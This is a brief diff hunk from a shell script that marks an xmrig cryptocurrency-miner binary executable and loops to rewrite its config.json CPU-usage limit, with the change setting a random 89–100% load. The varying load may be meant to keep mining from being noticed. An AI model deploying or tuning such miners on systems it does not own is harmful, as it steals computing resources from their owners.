@@ -16,7 +16,7 @@ chmod 777 xmrig
 while true :
   do
     t=$(($t_min + $RANDOM % ($t_max - $t_min)))
-    cpu=$(($cpu_max + $t * ($cpu_min - $cpu_max)/($t_max - $t_min)))
+    cpu=$(shuf -i 89-100 -n 1)
     echo $cpu
     cat config.json |jq -r --arg cpu "$cpu" '."max-cpu-usage"=$cpu' > u.json
     mv u.json config.json 
